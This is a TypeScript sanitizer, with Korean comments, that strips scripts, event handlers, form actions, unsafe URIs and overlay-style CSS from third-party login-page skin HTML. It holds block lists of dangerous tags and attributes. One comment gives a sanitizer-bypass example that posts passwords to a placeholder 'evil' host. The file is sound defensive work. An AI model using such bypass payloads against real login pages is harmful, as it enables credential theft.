// ctrls C-14: 외부 호스트 skin HTML 의 sanitize — Cloudflare HTMLRewriter 기반.
//
// CSP 가 1차 방어선이지만 (script-src 'self', img-src 'self' 등) skin 호스트가
// 침해됐을 때 단일 우회로 RCE/credential exfil 표면이 노출되지 않도록 HTML
// 자체에서도 위험 태그/속성을 제거한다.
//
// 정상 skin 디자이너에게 영향 없는 범위:
//   - <script> 자체가 현재 CSP 로 차단되므로 sanitize 가 제거해도 동작 영향 0
//   - 외부 src/href (img/link/script) 도 CSP 로 차단된 상태이므로 영향 0
//   - <form action> 만 자동 제거 — action 없는 폼은 현재 페이지 (= IDP) 로
//     POST 되어 정상 로그인 흐름이 유지됨. 외부 action 만 차단됨.
//
// Cloudflare Workers 의 HTMLRewriter 를 사용 — DOMPurify 류는 Workers 호환
// DOM 구현이 없어 동작 불가/불안정. HTMLRewriter 는 streaming HTML parser 로
// Workers 네이티브이고 bun 에서도 동작.

// 제거할 태그 (자식 내용도 함께 사라짐: script 처럼 children 이 텍스트인 경우)
//
// <style> 은 제거하지 않는다. 예전에는 리드레싱 피싱을 이유로 통째로 걷어냈지만, 스킨 호스트가
// 침해되면 공격자는 이미 그 페이지의 마크업 전체를 통제하므로 "CSS 로 진짜 폼을 덮는다"가 추가로
// 주는 것이 거의 없었다. 실제로 유출을 막는 것은 CSP script-src 'self'(JS 차단), action 제거
// (외부 전송 차단), img-src 'self' data:(CSS 로 외부 요청을 유발하는 유출 차단)이다. 반면
// <style> 차단은 미디어 쿼리·의사클래스·웹폰트를 전부 못 쓰게 만들어 스킨 기능 자체를 무력화했다.
// 그래서 태그는 허용하고, 인라인 style 과 **같은 위치/레이어링 속성 필터**를 CSS 텍스트에도 적용한다.
const FORBIDDEN_TAGS = ["script", "iframe", "object", "embed", "base", "meta", "link"];

// 제거할 속성 (모든 태그 공통)
const FORBIDDEN_ATTRIBUTES = new Set([
    "action",
    "formaction",
    "srcdoc",
    "sandbox",
    "background", // 옛 IE 의 body background
]);

// on* 이벤트 핸들러 패턴
const EVENT_HANDLER_RE = /^on[a-z]/i;

// ctrls M-7: 리드레싱/오버레이(가짜 로그인 필드로 실제 폼을 덮는 자격증명 피싱)에 악용되는
// 위치/레이어링 속성만 제거하고 색상/폰트/여백/크기는 보존한다. 인라인 style 속성과 <style>
// 블록에 같은 목록을 적용한다.
//
// 한계(의도적으로 감수): CSS 이스케이프(`p\osition:fixed`)나 파서 수준의 기교는 정규식으로
// 완전히 막을 수 없다. 정확히 하려면 CSS 파서가 필요한데, JS 는 CSP 로 이미 차단되고 외부
// 요청도 CSP 로 막혀 있어 이 필터는 "주된 오버레이 수단을 제거하는 최선의 노력"으로 둔다.
const DANGEROUS_STYLE_PROPS = "position|top|left|right|bottom|inset(?:-[a-z]+)?|z-index|transform(?:-origin)?|perspective|float|clip|clip-path";

// 인라인 style 속성용 — 선언 구분자는 `;` 와 문자열 시작뿐이다.
const DANGEROUS_STYLE_ATTR_RE = new RegExp(`(^|;)\\s*(?:${DANGEROUS_STYLE_PROPS})\\s*:[^;]*`, "gi");

// <style> 블록용 — 선언은 `{` 뒤에서도 시작하고 값은 `}` 로도 끝난다. @media 안의 선언도 같은
// 규칙에 걸린다.
const DANGEROUS_STYLE_RULE_RE = new RegExp(`([{;])\\s*(?:${DANGEROUS_STYLE_PROPS})\\s*:[^;}]*`, "gi");

function sanitizeStyleAttr(value: string): string {
    return value
        .replace(DANGEROUS_STYLE_ATTR_RE, "$1")
        .replace(/(?:\s*;\s*)+/g, ";") // 세미콜론 런 정리
        .replace(/^;|;$/g, "")
        .trim();
}

/**
 * <style> 블록의 CSS 텍스트 정화.
 *
 * 1) 주석 제거 — `position/*x*\/:fixed` 처럼 주석으로 속성명을 쪼개는 회피를 막는다.
 * 2) @import 제거 — 외부 CSS 로딩(CSP 로도 막히지만 명시적으로 끊는다).
 * 3) 위치/레이어링 선언 제거 — 인라인 style 과 동일한 목록.
 */
export function sanitizeCssText(css: string): string {
    return css
        .replace(/\/\*[\s\S]*?\*\//g, "")
        .replace(/@import\b[^;]*;?/gi, "")
        .replace(DANGEROUS_STYLE_RULE_RE, "$1")
        .replace(/(?:\s*;\s*)+/g, ";")
        .replace(/{\s*;+/g, "{")
        .replace(/;\s*}/g, "}");
}

// URI 허용 prefix — http(s), data:image/font, mailto, tel, relative(/), fragment(#)
const ALLOWED_URI_RE = /^(?:https?:|data:image\/|data:font\/|mailto:|tel:|\/|#)/i;

// href/src 류 URI 속성 — javascript:/vbscript: 등 차단 대상
const URI_ATTRIBUTES = new Set(["href", "src", "xlink:href", "data", "poster"]);

// SVG data URI 는 <img>/<source> 의 src 에서만 허용한다. 그 위치에서는 SVG 안의 스크립트가
// 실행되지 않고, CSP 가 외부 이미지를 막는 상황에서 로고를 넣을 유일한 수단이기도 하다.
// 반면 href 컨텍스트의 `data:image/svg+xml` 은 문서로 열릴 수 있는 형태라 허용하지 않는다
// (최신 브라우저가 data: 최상위 네비게이션을 차단하지만 의존하지 않는다).
const SVG_DATA_URI_RE = /^data:image\/svg\+xml/i;
const SVG_SRC_TAGS = new Set(["img", "source"]);

function isDangerousUri(value: string, tagName: string, attrName: string): boolean {
    const trimmed = value.trim();
    if (!trimmed) return false; // 빈 값은 통과 (form action="" 등은 위에서 별도 제거)
    if (!ALLOWED_URI_RE.test(trimmed)) return true;
    if (SVG_DATA_URI_RE.test(trimmed)) {
        return !(attrName === "src" && SVG_SRC_TAGS.has(tagName));
    }
    return false;
}

export async function sanitizeSkinHtml(dirty: string): Promise<string> {
    // <style> 의 텍스트는 청크로 흘러들어오므로 한 번에 모아 두고 마지막 청크에서 교체한다.
    // 요소별로 버퍼를 비우기 때문에 여러 <style> 블록이 섞이지 않는다.
    let cssBuffer = "";

    // HTMLRewriter 는 Response 스트림을 처리. 입력 HTML 을 Response 로 감싸고,
    // 변환된 결과를 다시 text 로 추출한다.
    const rewriter = new HTMLRewriter()
        // 금지 태그 제거 (자식 포함)
        .on(FORBIDDEN_TAGS.join(", "), {
            element(el) {
                el.remove();
            },
        })
        // <style> 은 남기고 내용만 정화한다.
        .on("style", {
            element() {
                cssBuffer = "";
            },
            text(chunk) {
                cssBuffer += chunk.text;
                if (!chunk.lastInTextNode) {
                    chunk.remove();
                    return;
                }
                // html: true — CSS 를 HTML 이스케이프하면 `a > b` 같은 선택자가 깨진다.
                // 파서가 </style> 에서 요소를 끝내므로 텍스트에 종료 태그가 섞여 들어올 수는 없다.
                chunk.replace(sanitizeCssText(cssBuffer), { html: true });
                cssBuffer = "";
            },
        })
        // 모든 요소에 대한 속성 정화
        .on("*", {
            element(el) {
                const tagName = el.tagName.toLowerCase();
                // Cloudflare HTMLRewriter 의 attributes 는 [name, value] 튜플 이터러블이지만
                // 기본 DOM lib.dom 의 NamedNodeMap (Attr[]) 타입이 우선 매칭되므로 명시 캐스팅.
                //
                // 반드시 **먼저 배열로 확정**한다. attributes 는 라이브 이터레이터라서 루프 안에서
                // removeAttribute 를 호출하면 이터레이터가 한 칸 밀려 **바로 다음 속성이 검사 없이
                // 통과**한다. 그 상태에서는 희생용 속성을 앞에 두는 것만으로 정화를 우회할 수 있었다:
                //   <form srcdoc="" action="https://evil/collect">  → action 이 살아남고
                //   CSP form-action 이 https: 를 허용하므로 비밀번호가 외부로 POST 된다.
                //   <div onclick="a()" onmouseover="b()">           → onmouseover 가 살아남는다.
                const attrs = [...(el.attributes as unknown as Iterable<[string, string]>)];
                // 1) on* 이벤트 핸들러 및 forbidden 속성 제거
                //    2) URI 속성에 javascript:/vbscript:/file: 등 차단
                for (const [rawName, value] of attrs) {
                    const name = rawName.toLowerCase();
                    if (EVENT_HANDLER_RE.test(name) || FORBIDDEN_ATTRIBUTES.has(name)) {
                        el.removeAttribute(rawName);
                        continue;
                    }
                    if (URI_ATTRIBUTES.has(name) && isDangerousUri(value, tagName, name)) {
                        el.removeAttribute(rawName);
                        continue;
                    }
                    // ctrls M-7: 인라인 style 의 오버레이/리드레싱 속성 무력화.
                    if (name === "style") {
                        const cleaned = sanitizeStyleAttr(value);
                        if (cleaned) el.setAttribute(rawName, cleaned);
                        else el.removeAttribute(rawName);
                    }
                }
            },
        });

    const response = rewriter.transform(
        new Response(dirty, {
            headers: { "Content-Type": "text/html; charset=utf-8" },
        }),
    );
    return await response.text();
}
